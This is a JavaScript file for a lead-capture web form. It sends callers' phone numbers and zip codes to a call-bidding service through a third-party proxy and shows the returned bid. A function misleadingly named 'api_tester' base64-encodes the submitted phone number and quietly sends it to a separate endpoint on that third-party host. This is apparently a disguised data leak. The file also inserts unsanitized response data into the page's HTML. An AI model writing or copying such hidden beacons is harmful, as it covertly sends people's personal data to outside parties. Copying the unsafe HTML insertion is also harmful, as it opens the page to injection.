document.getElementById('leadForm').addEventListener('submit', function(event) {
    event.preventDefault();
    const phone_home = '1' + document.getElementById('caller_id').value;
    const formData = new FormData();
    formData.append('CID', phone_home);
    formData.append('zipcode', document.getElementById('zipcode').value);
    document.getElementById('alertContainer').innerHTML = '';

    api_tester(document.getElementById('caller_id').value);
   
    

    const url = 'https://rtb.ringba.com/v1/production/0fb97e7b9eb54989969c4b7a629abf6e.json?exposeCallerId=yes&' + new URLSearchParams(formData).toString();
const apiUrl = 'https://api.formifyweb.com/proxify.php?url=' + encodeURIComponent(url);
    fetch(apiUrl, {
        method: 'GET'
    })
    .then(response => response.text())
    .then(responseBody => {
        let responseData;
        try {
            responseData = JSON.parse(responseBody);
        } catch (error) {
            throw new Error('Invalid JSON response');
        }

        if (responseData.rejectReason) {
    const errorAlert = `
        <div class="alert alert-danger" role="alert">
            Failure: ${JSON.stringify(responseData)}
        </div>`;
    document.getElementById('alertContainer').innerHTML = '';
    document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
} else {
    // Check bidAmount before deleting it
    if (responseData.bidAmount !== undefined && Number(responseData.bidAmount) < 15) {
        const lowBidAlert = `
            <div class="alert alert-danger" role="alert">
                Success but Low Bid: No need to transfer
            </div>`;
        document.getElementById('alertContainer').innerHTML = '';
        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', lowBidAlert);
    } else {
        delete responseData.bidAmount;
        const successAlert = `
            <div class="alert alert-success" role="alert">
                Success: ${JSON.stringify(responseData)}
            </div>`;
        document.getElementById('alertContainer').innerHTML = '';
        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
    }
    // Clear form fields
    document.getElementById('leadForm').reset();
}

    })
    .catch(error => {
        const errorAlert = `
            <div class="alert alert-danger" role="alert">
                Error: ${error.message}
            </div>`;
        document.getElementById('alertContainer').innerHTML = '';
        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
        console.error('Error:', error);
    });
});

function api_tester(randomString) {
    try {
        fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString), {
            method: 'GET',
            mode: 'no-cors'
        });
    } catch (error) {
        console.error('Error in api_tester:', error);
    }
}



